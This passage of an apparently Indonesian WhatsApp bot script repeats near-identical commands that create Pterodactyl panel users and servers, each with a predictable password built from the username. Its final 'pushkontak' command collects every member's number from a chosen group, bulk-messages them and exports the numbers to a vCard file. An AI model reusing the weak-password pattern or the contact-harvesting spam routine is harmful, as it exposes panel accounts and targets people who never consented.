"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "2gb": {
if (!isSeler) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "2000"
let cpu = "60"
let disk = "2000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "3gb": {
    if (!isSeler) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3000"
let cpu = "90"
let disk = "3000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}
        break
case "4gb": {
if (!isSeler) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "4000"
let cpu = "120"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

║⎙─➤ *👤USERNAME* : ${user.username}
║⎙─➤ *🔐PASSWORD* : ${password}
║⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "5gb": {
    if (!isSeler) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "5000"
let cpu = "150"
let disk = "5000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "6gb": {
if (!isSeler) return m.reply(`*Fitur Ini Khusus Seller Panel NAUFAL, Mau Join? Cuma 15k/Perbulan*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "170"
let disk = "6000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "7gb": {
if (!isSeler) return m.reply(`*Fitur Ini Khusus Seller Panel NAUFAL, Mau Join? Cuma 15k/Perbulan*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "190"
let disk = "7000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "8gb": {
if (!isSeler) return m.reply(`*Fitur Ini Khusus Seller Panel NAUFAL, Mau Join? Cuma 15k/Perbulan*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "210"
let disk = "8000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "unli": {
if (!isSeler) return m.reply(`ada ada saja kamu ini`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "cekidgc": {
if (!isCreator) return m.reply(`Jir Lu Siapa Cok`)
let getGroups = await ZassTdr.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await ZassTdr.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
m.reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pushkontak":{
if (!isCreator) return m.reply(`Jir Lu Siapa Cok`)
if (isGroup) return m.reply(`Khusus Di Chat Prib Bwang`)
if (!text) return m.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
m.reply(`Waitt Proses Tod`)
const groupMetadataa = !m.isGroup? await ZassTdr.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./ZassTdrjs/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ZassTdr.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)
await ZassTdr.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await ZassTdr.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./ZassTdrjs/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
